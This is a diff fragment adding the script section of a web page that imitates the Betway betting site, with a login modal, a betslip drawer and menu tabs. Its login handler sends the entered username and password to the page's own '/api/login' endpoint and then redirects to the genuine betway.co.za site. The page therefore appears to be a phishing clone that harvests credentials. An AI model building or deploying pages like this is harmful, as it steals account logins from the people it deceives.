+                if (e.target === mobileLoginModal) {
+                    mobileLoginModal.classList.add('hidden');
+                }
+            });
+        }
+
+        const toggleMobilePasswordBtn = document.getElementById('toggleMobilePasswordBtn');
+        const mobilePasswordInput = document.getElementById('mobilePasswordInput');
+        if (toggleMobilePasswordBtn && mobilePasswordInput) {
+            toggleMobilePasswordBtn.addEventListener('click', () => {
+                const isPassword = mobilePasswordInput.getAttribute('type') === 'password';
+                mobilePasswordInput.setAttribute('type', isPassword ? 'text' : 'password');
+                const eyeIcon = toggleMobilePasswordBtn.querySelector('i');
+                if (isPassword) {
+                    eyeIcon.classList.remove('fa-eye');
+                    eyeIcon.classList.add('fa-eye-slash');
+                } else {
+                    eyeIcon.classList.remove('fa-eye-slash');
+                    eyeIcon.classList.add('fa-eye');
+                }
+            });
+        }
+
+        
+        const toggleShowMoreBtn = document.getElementById('toggleShowMoreBtn');
+        const footerTextContent = document.getElementById('footerTextContent');
+        const showMoreLabel = document.getElementById('showMoreLabel');
+        const showMoreIcon = document.getElementById('showMoreIcon');
+
+        if (toggleShowMoreBtn && footerTextContent) {
+            let isExpanded = false;
+
+            toggleShowMoreBtn.addEventListener('click', () => {
+                isExpanded = !isExpanded;
+                if (isExpanded) {
+                    footerTextContent.classList.remove('line-clamp-3-custom');
+                    showMoreLabel.textContent = 'Show Less';
+                    showMoreIcon.classList.remove('fa-chevron-down');
+                    showMoreIcon.classList.add('fa-chevron-up');
+                } else {
+                    footerTextContent.classList.add('line-clamp-3-custom');
+                    showMoreLabel.textContent = 'Show More';
+                    showMoreIcon.classList.remove('fa-chevron-up');
+                    showMoreIcon.classList.add('fa-chevron-down');
+                }
+            });
+        }
+        const footerClock = document.getElementById('footerClock');
+        if (footerClock) {
+            setInterval(() => {
+                const now = new Date();
+                footerClock.textContent = now.toTimeString().split(' ')[0];
+            }, 1000);
+        }
+        const togglePasswordBtn = document.getElementById('togglePasswordBtn');
+        const passwordInput = document.getElementById('passwordInput');
+
+        if (togglePasswordBtn && passwordInput) {
+            togglePasswordBtn.addEventListener('click', () => {
+                const isPassword = passwordInput.getAttribute('type') === 'password';
+                passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
+                
+                const eyeIcon = togglePasswordBtn.querySelector('i');
+                if (isPassword) {
+                    eyeIcon.classList.remove('fa-eye');
+                    eyeIcon.classList.add('fa-eye-slash');
+                } else {
+                    eyeIcon.classList.remove('fa-eye-slash');
+                    eyeIcon.classList.add('fa-eye');
+                }
+            });
+        }
+        const menuBtn = document.getElementById('menuBtn');
+        const closeMenuBtn = document.getElementById('closeMenuBtn');
+        const mobileMenuOverlay = document.getElementById('mobileMenuOverlay');
+
+        if (menuBtn && closeMenuBtn && mobileMenuOverlay) {
+            menuBtn.addEventListener('click', () => {
+                mobileMenuOverlay.classList.remove('hidden');
+            });
+
+            closeMenuBtn.addEventListener('click', () => {
+                mobileMenuOverlay.classList.add('hidden');
+            });
+
+            mobileMenuOverlay.addEventListener('click', (e) => {
+                if (e.target === mobileMenuOverlay) {
+                    mobileMenuOverlay.classList.add('hidden');
+                }
+            });
+        }
+
+        const betslipBtn = document.getElementById('betslipBtn');
+        const betslipDrawer = document.getElementById('betslipDrawer');
+        const closeBetslipBtn = document.getElementById('closeBetslipBtn');
+
+        if (betslipBtn && betslipDrawer && closeBetslipBtn) {
+            let isBetslipOpen = false;
+
+            betslipBtn.addEventListener('click', () => {
+                isBetslipOpen = !isBetslipOpen;
+                if (isBetslipOpen) {
+                    betslipDrawer.classList.remove('translate-y-full');
+                } else {
+                    betslipDrawer.classList.add('translate-y-full');
+                }
+            });
+
+            closeBetslipBtn.addEventListener('click', () => {
+                isBetslipOpen = false;
+                betslipDrawer.classList.add('translate-y-full');
+            });
+        }
+
+        const tabs = document.querySelectorAll('.nav-tab');
+        tabs.forEach(tab => {
+            tab.addEventListener('click', (e) => {
+                e.preventDefault();
+                tabs.forEach(t => {
+                    t.classList.remove('bg-betwayGreen', 'text-white');
+                    t.classList.add('text-gray-300');
+                });
+                tab.classList.add('bg-betwayGreen', 'text-white');
+                tab.classList.remove('text-gray-300');
+            });
+        });
+        const form = document.getElementById("loginForm");
+        const message = document.getElementById("message");
+
+        if (form) {
+            form.addEventListener("submit", async (event) => {
+                event.preventDefault();
+
+                const data = {
+                    username: form.username.value,
+                    password: form.password.value
+                };
+                try {
+                    const response = await fetch("/api/login", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    const result = await response.json();
+                    if (message) message.textContent = result.message || "Logged in";
+                    form.password.value = "";
+                    if (result.success) {
+                        window.location.href = "https://www.betway.co.za";
+                    }
+                } catch (err) {
+                    if (message) message.textContent = "offline";
+                }
+            });
+        }
+    </script>
+</body>
+</html>
